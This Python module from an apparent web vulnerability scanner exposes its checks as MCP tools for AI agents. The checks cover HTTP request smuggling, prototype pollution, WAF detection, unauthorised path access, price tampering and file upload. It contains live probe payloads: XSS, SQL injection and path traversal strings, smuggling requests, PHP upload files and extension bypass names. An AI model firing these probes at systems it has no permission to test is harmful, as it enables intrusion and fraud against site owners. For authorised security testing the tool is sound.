#!/usr/bin/env python3
"""
漏洞检测工具 - 高级漏洞检测
包含: 请求走私、原型污染、浏览器扫描、WAF检测、访问控制测试、逻辑漏洞、文件上传
"""
import logging
import time
import re
from urllib.parse import urlparse, quote

from .._common import GLOBAL_CONFIG, HAS_REQUESTS, get_verify_ssl

if HAS_REQUESTS:
    import requests

logger = logging.getLogger(__name__)


# ============ HTTP请求走私检测 ============

def request_smuggling_detect(url: str) -> dict:
    """HTTP请求走私检测 - CL.TE / TE.CL / TE.TE变体检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    parsed = urlparse(url)
    host = parsed.netloc

    # CL.TE检测Payload
    cl_te_payloads = [
        # 基础CL.TE
        (
            f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n\r\n"
            "1\r\nG\r\n0\r\n\r\n",
            "CL.TE"
        ),
        # TE.CL检测
        (
            f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n\r\n"
            "0\r\n\r\nG",
            "TE.CL"
        ),
    ]

    # 使用socket进行低级测试
    try:
        import socket
        import ssl

        for payload, smuggle_type in cl_te_payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)

                port = 443 if parsed.scheme == "https" else int(parsed.port or 80)
                
                if parsed.scheme == "https":
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=host.split(':')[0])
                
                sock.connect((host.split(':')[0], port))
                sock.send(payload.encode())
                
                # 发送第二个请求检测响应
                time.sleep(1)
                second_request = (
                    f"GET {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    "Connection: close\r\n\r\n"
                )
                sock.send(second_request.encode())
                
                response = sock.recv(4096).decode(errors='ignore')
                sock.close()

                # 检测异常响应
                if "405" in response or "GPOST" in response or response.count("HTTP/1.1") > 1:
                    vulns.append({
                        "type": f"HTTP Request Smuggling ({smuggle_type})",
                        "severity": "CRITICAL",
                        "detail": f"检测到{smuggle_type}类型的请求走私漏洞",
                        "url": url
                    })

            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

    except ImportError:
        logger.warning("Socket module not available")

    return {
        "success": True,
        "url": url,
        "smuggling_vulns": vulns,
        "total": len(vulns),
        "recommendations": [
            "确保前端和后端服务器使用相同的请求解析方式",
            "禁用HTTP/1.1的keep-alive连接",
            "配置WAF检测请求走私",
            "升级到HTTP/2"
        ] if vulns else []
    }


# ============ 原型污染检测 ============

PROTOTYPE_POLLUTION_PAYLOADS = [
    {"__proto__": {"polluted": "true"}},
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"__proto__.polluted": "true"},
    {"constructor.prototype.polluted": "true"},
]


def prototype_pollution_detect(url: str, param: str = None) -> dict:
    """原型污染检测 - JavaScript原型链污染漏洞检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    import json as json_module

    for payload in PROTOTYPE_POLLUTION_PAYLOADS:
        try:
            # JSON Body测试
            headers = {"Content-Type": "application/json"}
            resp = requests.post(
                url, 
                data=json_module.dumps(payload), 
                headers=headers, 
                timeout=10, 
                verify=get_verify_ssl()
            )

            # 检查响应中是否包含污染标记
            if "polluted" in resp.text and "true" in resp.text:
                vulns.append({
                    "type": "Prototype Pollution",
                    "severity": "HIGH",
                    "payload": str(payload),
                    "method": "POST JSON",
                    "url": url
                })
                break

            # URL参数测试
            param_name = param or "__proto__[polluted]"
            test_url = f"{url}{'&' if '?' in url else '?'}{param_name}=true"
            resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

            if "polluted" in resp.text:
                vulns.append({
                    "type": "Prototype Pollution",
                    "severity": "HIGH",
                    "param": param_name,
                    "method": "GET",
                    "url": test_url
                })
                break

        except Exception:
            logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "pollution_vulns": vulns,
        "total": len(vulns),
        "recommendations": [
            "使用Object.freeze()保护原型",
            "使用Map代替普通对象",
            "验证和过滤所有用户输入的对象键",
            "使用--frozen-intrinsics或--disable-proto标志"
        ] if vulns else []
    }


# ============ WAF检测 ============

WAF_SIGNATURES = {
    "cloudflare": ["cf-ray", "cf-cache-status", "__cfduid", "cloudflare"],
    "akamai": ["akamai", "x-akamai", "akamaighost"],
    "aws_waf": ["awselb", "x-amz", "x-amzn"],
    "imperva": ["incapsula", "visid_incap", "x-iinfo"],
    "f5_bigip": ["bigip", "x-cnection", "f5"],
    "fortinet": ["fortigate", "fortiweb", "fgpassword"],
    "modsecurity": ["mod_security", "modsec", "owasp"],
    "sucuri": ["sucuri", "x-sucuri"],
    "barracuda": ["barra_counter_session", "barracuda"],
    "comodo": ["comodo"],
}

WAF_TRIGGER_PAYLOADS = [
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "../../etc/passwd",
    "${7*7}",
    "{{7*7}}",
]


def waf_detect(url: str) -> dict:
    """WAF检测 - Web应用防火墙检测与识别"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    detected_wafs = []
    waf_evidence = {}

    try:
        # 正常请求
        normal_resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        normal_headers = {k.lower(): v.lower() for k, v in normal_resp.headers.items()}
        normal_cookies = {k.lower(): v for k, v in normal_resp.cookies.items()}

        # 检查响应头和Cookie中的WAF签名
        for waf_name, signatures in WAF_SIGNATURES.items():
            for sig in signatures:
                if sig in str(normal_headers) or sig in str(normal_cookies) or sig in normal_resp.text.lower():
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)
                        waf_evidence[waf_name] = sig
                        break

        # 触发WAF
        for payload in WAF_TRIGGER_PAYLOADS:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}test={quote(payload)}"
                trigger_resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                # 检查是否被拦截
                if trigger_resp.status_code in [403, 406, 429, 503]:
                    # 再次检查WAF签名
                    trigger_headers = {k.lower(): v.lower() for k, v in trigger_resp.headers.items()}
                    for waf_name, signatures in WAF_SIGNATURES.items():
                        for sig in signatures:
                            if sig in str(trigger_headers) or sig in trigger_resp.text.lower():
                                if waf_name not in detected_wafs:
                                    detected_wafs.append(waf_name)
                                    waf_evidence[waf_name] = f"Blocked with signature: {sig}"
                                    break

                    # 通用WAF检测
                    if not detected_wafs:
                        if any(kw in trigger_resp.text.lower() for kw in ["blocked", "forbidden", "security", "firewall"]):
                            detected_wafs.append("unknown_waf")
                            waf_evidence["unknown_waf"] = f"Blocked status: {trigger_resp.status_code}"

                    break

            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

    except Exception:
        logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "waf_detected": len(detected_wafs) > 0,
        "detected_wafs": detected_wafs,
        "evidence": waf_evidence,
        "total": len(detected_wafs)
    }


# ============ 访问控制测试 ============

def access_control_test(url: str, protected_paths: list = None, auth_cookie: str = None) -> dict:
    """访问控制测试 - 测试未授权访问和权限提升"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    default_paths = [
        "/admin", "/administrator", "/admin.php", "/wp-admin",
        "/manager", "/console", "/dashboard", "/panel",
        "/api/admin", "/api/users", "/api/config",
        "/.git/config", "/.env", "/config.php", "/web.config",
        "/backup", "/debug", "/test", "/phpinfo.php",
        "/server-status", "/server-info",
    ]

    test_paths = protected_paths if protected_paths else default_paths

    for path in test_paths:
        try:
            test_url = f"{base_url}{path}"
            
            # 无认证请求
            resp = requests.get(test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False)

            # 检查是否可访问
            if resp.status_code == 200:
                # 检查响应内容是否有意义
                if len(resp.text) > 200:
                    sensitive_keywords = ["admin", "config", "password", "secret", "database", "api_key", "token"]
                    has_sensitive = any(kw in resp.text.lower() for kw in sensitive_keywords)
                    
                    findings.append({
                        "type": "Unauthorized Access",
                        "severity": "HIGH" if has_sensitive else "MEDIUM",
                        "path": path,
                        "status": resp.status_code,
                        "has_sensitive_content": has_sensitive,
                        "url": test_url
                    })

            # 检查方法绕过
            for method in ["POST", "PUT", "DELETE", "PATCH", "OPTIONS"]:
                try:
                    method_resp = requests.request(method, test_url, timeout=5, verify=get_verify_ssl())
                    if method_resp.status_code == 200 and resp.status_code in [401, 403]:
                        findings.append({
                            "type": "HTTP Method Bypass",
                            "severity": "HIGH",
                            "path": path,
                            "method": method,
                            "url": test_url
                        })
                        break
                except Exception:
                    logger.warning("Suppressed exception", exc_info=True)

        except Exception:
            logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "access_control_findings": findings,
        "total": len(findings),
        "paths_tested": len(test_paths)
    }


# ============ 逻辑漏洞检测 ============

def logic_vuln_check(url: str, test_type: str = "all") -> dict:
    """逻辑漏洞检测 - 业务逻辑漏洞检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []

    # 价格篡改测试
    if test_type in ["all", "price"]:
        price_params = ["price", "amount", "total", "cost", "value", "quantity", "qty"]
        for param in price_params:
            for value in ["-1", "0", "0.01", "99999999"]:
                try:
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={value}"
                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                    
                    if resp.status_code == 200 and "success" in resp.text.lower():
                        findings.append({
                            "type": "Price Manipulation",
                            "severity": "HIGH",
                            "param": param,
                            "value": value,
                            "url": test_url
                        })
                except Exception:
                    logger.warning("Suppressed exception", exc_info=True)

    # 负数量测试
    if test_type in ["all", "quantity"]:
        qty_params = ["quantity", "qty", "count", "num", "amount"]
        for param in qty_params:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}=-1"
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                
                if resp.status_code == 200:
                    findings.append({
                        "type": "Negative Quantity",
                        "severity": "MEDIUM",
                        "param": param,
                        "url": test_url
                    })
            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

    # 竞态条件测试提示
    if test_type in ["all", "race"]:
        findings.append({
            "type": "Race Condition (Manual Test Required)",
            "severity": "INFO",
            "detail": "竞态条件需要使用并发请求工具（如Burp Turbo Intruder）进行测试"
        })

    return {
        "success": True,
        "url": url,
        "logic_vulns": findings,
        "total": len(findings),
        "note": "逻辑漏洞检测需要结合业务场景进行人工验证"
    }


# ============ 文件上传检测 ============

def file_upload_detect(url: str, param: str = "file") -> dict:
    """文件上传检测 - 不安全的文件上传漏洞检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []

    # 危险文件扩展名测试
    dangerous_extensions = [
        ("test.php", b"<?php echo 'test'; ?>", "application/x-php"),
        ("test.php5", b"<?php echo 'test'; ?>", "application/x-php"),
        ("test.phtml", b"<?php echo 'test'; ?>", "application/x-php"),
        ("test.jsp", b"<% out.println(\"test\"); %>", "text/plain"),
        ("test.asp", b"<% Response.Write(\"test\") %>", "text/plain"),
        ("test.aspx", b"<%@ Page Language=\"C#\" %>", "text/plain"),
        ("test.html", b"<script>alert(1)</script>", "text/html"),
        ("test.svg", b'<svg onload="alert(1)">', "image/svg+xml"),
    ]

    # 双扩展名绕过
    bypass_filenames = [
        "test.php.jpg",
        "test.jpg.php",
        "test.php%00.jpg",
        "test.php;.jpg",
        "test.pHp",
        "test.php::$DATA",
    ]

    for filename, content, content_type in dangerous_extensions[:3]:  # 限制测试数量
        try:
            files = {param: (filename, content, content_type)}
            resp = requests.post(url, files=files, timeout=15, verify=get_verify_ssl())

            # 检查是否上传成功
            if resp.status_code == 200:
                success_indicators = ["success", "uploaded", "完成", "成功", "saved"]
                if any(ind in resp.text.lower() for ind in success_indicators):
                    vulns.append({
                        "type": "Dangerous File Upload",
                        "severity": "CRITICAL",
                        "filename": filename,
                        "content_type": content_type,
                        "url": url
                    })

        except Exception:
            logger.warning("Suppressed exception", exc_info=True)

    # 绕过测试
    for filename in bypass_filenames[:3]:
        try:
            files = {param: (filename, b"<?php echo 'test'; ?>", "image/jpeg")}
            resp = requests.post(url, files=files, timeout=15, verify=get_verify_ssl())

            if resp.status_code == 200 and "success" in resp.text.lower():
                vulns.append({
                    "type": "File Upload Bypass",
                    "severity": "CRITICAL",
                    "filename": filename,
                    "url": url
                })

        except Exception:
            logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "upload_vulns": vulns,
        "total": len(vulns),
        "recommendations": [
            "使用白名单验证文件扩展名",
            "验证文件MIME类型和magic bytes",
            "将上传文件存储在Web根目录之外",
            "重命名上传的文件",
            "设置适当的文件权限"
        ] if vulns else []
    }


# ============ 浏览器扫描 ============

def browser_scan(url: str) -> dict:
    """浏览器扫描 - 检测客户端安全问题"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []

    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        html = resp.text

        # 检查内联JavaScript
        inline_scripts = re.findall(r'<script[^>]*>(.+?)</script>', html, re.DOTALL | re.IGNORECASE)
        for script in inline_scripts:
            # 检查危险的JavaScript模式
            if "eval(" in script or "document.write(" in script:
                findings.append({
                    "type": "Dangerous JavaScript",
                    "severity": "MEDIUM",
                    "detail": "发现使用eval()或document.write()",
                    "recommendation": "避免使用eval()和document.write()"
                })
                break

            if "innerHTML" in script and ("user" in script.lower() or "input" in script.lower()):
                findings.append({
                    "type": "DOM XSS Risk",
                    "severity": "MEDIUM",
                    "detail": "innerHTML与用户输入结合使用",
                    "recommendation": "使用textContent代替innerHTML"
                })

        # 检查外部脚本
        external_scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
        for src in external_scripts:
            if not src.startswith("https://") and not src.startswith("//"):
                if src.startswith("http://"):
                    findings.append({
                        "type": "Insecure Script Source",
                        "severity": "MEDIUM",
                        "src": src,
                        "detail": "通过HTTP加载JavaScript"
                    })

        # 检查localStorage/sessionStorage使用
        if "localStorage" in html or "sessionStorage" in html:
            sensitive_patterns = ["token", "password", "secret", "key", "auth"]
            for pattern in sensitive_patterns:
                if pattern in html.lower():
                    findings.append({
                        "type": "Sensitive Data in Storage",
                        "severity": "LOW",
                        "detail": f"可能在本地存储中存储敏感数据: {pattern}",
                        "recommendation": "不要在本地存储中存储敏感数据"
                    })
                    break

        # 检查iframe
        iframes = re.findall(r'<iframe[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
        for src in iframes:
            if "sandbox" not in html[html.find(src)-100:html.find(src)].lower():
                findings.append({
                    "type": "Iframe without Sandbox",
                    "severity": "LOW",
                    "src": src[:100],
                    "recommendation": "为iframe添加sandbox属性"
                })

    except Exception:
        logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "browser_findings": findings,
        "total": len(findings)
    }


# ============ MCP工具注册 ============

def register_advanced_tools(mcp) -> None:
    """注册高级漏洞检测工具到MCP服务器"""
    
    @mcp.tool()
    def request_smuggling_detect_tool(url: str) -> dict:
        """HTTP请求走私检测"""
        return request_smuggling_detect(url)
    
    @mcp.tool()
    def prototype_pollution_detect_tool(url: str, param: str = None) -> dict:
        """原型污染检测"""
        return prototype_pollution_detect(url, param)
    
    @mcp.tool()
    def waf_detect_tool(url: str) -> dict:
        """WAF检测"""
        return waf_detect(url)
    
    @mcp.tool()
    def access_control_test_tool(url: str, protected_paths: list = None, auth_cookie: str = None) -> dict:
        """访问控制测试"""
        return access_control_test(url, protected_paths, auth_cookie)
    
    @mcp.tool()
    def logic_vuln_check_tool(url: str, test_type: str = "all") -> dict:
        """逻辑漏洞检测"""
        return logic_vuln_check(url, test_type)
    
    @mcp.tool()
    def file_upload_detect_tool(url: str, param: str = "file") -> dict:
        """文件上传检测"""
        return file_upload_detect(url, param)
    
    @mcp.tool()
    def browser_scan_tool(url: str) -> dict:
        """浏览器扫描"""
        return browser_scan(url)
    
    logger.info("已注册高级漏洞检测工具: request_smuggling, prototype_pollution, waf, access_control, logic_vuln, file_upload, browser_scan")


__all__ = [
    "request_smuggling_detect",
    "prototype_pollution_detect",
    "waf_detect",
    "access_control_test",
    "logic_vuln_check",
    "file_upload_detect",
    "browser_scan",
    "register_advanced_tools",
]